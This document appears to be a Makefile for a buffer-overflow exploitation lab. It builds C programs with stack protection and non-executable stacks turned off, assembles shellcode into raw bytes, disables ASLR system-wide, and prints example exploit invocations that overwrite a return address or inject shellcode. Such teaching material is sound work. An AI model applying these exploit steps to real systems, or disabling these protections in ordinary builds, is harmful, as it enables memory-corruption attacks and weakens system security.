all: buffer-crash buffer-variable buffer-return function function_opt shell_call shellcode_start shellcode_demo shellcode.bin ASLR

ASLR:
	@echo '### Disabeling ASLR ###'
	@echo 0 > /proc/sys/kernel/randomize_va_space

example_function_call: example_function_call.c ASLR
	gcc -g -fno-stack-protector -z execstack -O0  example_function_call.c -o example_function_call
	@echo "*** Howto ***"
	@pandoc example_function_call.md | lynx -dump -stdin

buffer-crash: buffer-crash.c
	gcc -g -fno-stack-protector -z execstack -O0  buffer-crash.c -o buffer-crash
	@echo "Try the following on bo_crash:"
	@echo './buffer-crash 1234'
	@echo './buffer-crash 1234567'
	@echo './buffer-crash 12345678'
	
buffer-variable: buffer-variable.c
	gcc -g -fno-stack-protector -z execstack -O0  buffer-variable.c -o buffer-variable	
	
buffer-return: buffer-return.c
	gcc -g -fno-stack-protector -z execstack -O0  buffer-return.c -o buffer-return	
	@echo 'edb --run ./buffer-return `echo -n -e '123456781234567812345678123456781234567812345678123456781234567812345678\xd1\x51\x55\x55\x55\x55'`'
	@echo 'edb --run ./buffer-return "`./gen_shellcode.py shellcode_start.bin 26`"'
	@echo 'edb --run ./buffer-return "`./gen_shellcode.py shellcode.bin 26`"'
	

	
function_opt: function.c
	gcc -g -fno-stack-protector -z execstack -O5  function.c -o function_opt	
	
shell_call: shell_call.c
	gcc -g -fno-stack-protector -z execstack -O1  shell_call.c -o shell_call	
	objdump -d -Mintel shell_call

shellcode_start: shellcode_start.asm
	nasm -felf64  -o shellcode_start.o shellcode_start.asm 
	ld -g -z execstack -o shellcode_start shellcode_start.o 
	objdump -d -Mintel shellcode_start	
	objcopy -O binary -j .text shellcode_start shellcode_start.raw
	perl -p -e  's/\x0f\x05.*/\x0f\x05/g;' shellcode_start.raw > shellcode_start.bin
	xxd  -ps -c0 shellcode_start.bin
	
shellcode_demo: shellcode_demo.asm
	nasm -felf64  -o shellcode_demo.o shellcode_demo.asm 
	ld -g -z execstack -o shellcode_demo shellcode_demo.o 
	objdump -d -Mintel shellcode_demo	
	
shellcode.bin: shellcode.asm
	nasm -felf64 -o shellcode.o shellcode.asm 
	ld -g -z execstack -o shellcode shellcode.o 
	objdump -d -Mintel shellcode	
	objcopy -O binary -j .text shellcode shellcode.raw
	perl -p -e  's/\x0f\x05.*/\x0f\x05/g;' shellcode.raw > shellcode.bin
	xxd  -ps -c0 shellcode.bin
	
clean:
	- rm buffer-crash 2>/dev/null
	- rm buffer-variable 2>/dev/null
	- rm buffer-return 2>/dev/null
	- rm example_function_call 2>/dev/null
	- rm function_opt 2>/dev/null
	- rm shell_call 2>/dev/null
	- rm shellcode 2>/dev/null
	- rm shellcode_demo 2>/dev/null
	- rm shellcode_start 2>/dev/null
	- rm shellcode.raw 2>/dev/null
	- rm shellcode_start.raw 2>/dev/null
	
	
	- rm *~ 2>/dev/null
	- rm *.o 2>/dev/null
	- rm *.bin 2>/dev/null
		
tgz: clean
	tar -czvf ../buffer_overflow.tgz ../Buffer\ Overflow/
edit:
	bluefish *.c *.py *.asm Makefile 2> /dev/zero > /dev/zero  &
